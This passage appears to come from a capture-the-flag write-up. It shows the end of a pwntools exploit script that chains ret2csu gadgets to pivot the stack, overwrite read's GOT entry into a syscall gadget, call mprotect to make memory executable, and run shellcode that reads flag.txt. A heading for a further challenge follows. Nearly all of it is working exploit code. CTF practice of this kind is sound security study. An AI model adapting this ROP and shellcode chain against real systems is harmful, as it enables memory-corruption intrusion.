        csu_pop,
        junk,
        0x0,
        rbp,
        edi,
        rsi,
        rdx,
        ptr,
        csu_call,
        junk,
        0x1,
        rsi,
        0x3,
        0x4,
        0x5,
        0x6
    ])

    return payload


def solve():

    ##############################################################################
    # Stage 1: Stack Pivot to bss section
    ##############################################################################
    
    offset = 40
    leave_ret = 0x40132d # leave; ret;
    data_addr = 0x404500 

    stack_pivot = ret2csu(0, data_addr, 0x500, 0, 1, exe.got['read'], b'a'*8)

    payload = flat({
        offset: [
            stack_pivot,
            leave_ret
        ]
    })

    io.send(payload)
    info("stack pivot to: %#x", data_addr)

    ##############################################################################
    # Stage 2: Overwrite the got of read to syscall
    ##############################################################################

    overwrite = ret2csu(0, exe.got['read'], 1, 0, 1, exe.got['read'], b'b'*8)

    ropchain = flat(
        [   
            b'a'*8,
            overwrite
        ]
    )

    """
    Future read calls are now a syscall gadget
    Also rax is the untouched on read return, so rax=0x1=SYS_write
    So we now call write() to set rax
    """

    ##############################################################################
    # Stage 3: Call write() to set rax to mprotect syscall number 
    ##############################################################################

    sys_number = 0xA
    set_rax = ret2csu(1, data_addr, sys_number, 0, 1, exe.got['read'], b'c'*8)
    
    ropchain += set_rax
 
    ################################################################################
    # Stage 3: Call mprotect() to make data_addr readable/writeable/executable (rwx)
    ################################################################################

    page_size = 4096
    data_page = data_addr & ~(page_size - 1)
    prot = 0x7
    size = 0x1000

    mprotect = ret2csu(data_page, size, prot, 0, 1, exe.got['read'], b'd'*8)

    ropchain += mprotect

    ################################################################################
    # Stage 3: Call shellcode: I'm doing sendfile(1, open('flag.txt', 0), 0, 0x100)
    ################################################################################

    sc_addr = data_addr + len(ropchain) + 8
    info("shellcode address: %#x", sc_addr)

    shellcode  =  asm('nop')*30
    shellcode +=  asm(shellcraft.open(b'flag.txt\x00', constants.O_RDONLY))
    shellcode +=  asm(shellcraft.sendfile(1, 'rax', 0x0, 0x100))
    shellcode +=  asm(shellcraft.exit(0))

    sleep(1)

    ropchain += p64(sc_addr)
    ropchain += shellcode

    io.send(ropchain)
    io.sendline(p8(0xf0))


    io.interactive()



def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

```



####Iloveseccomp

![image](https://github.com/user-attachments/assets/4b536045-de7c-4de9-a0e1-5cfedb38e98b)



















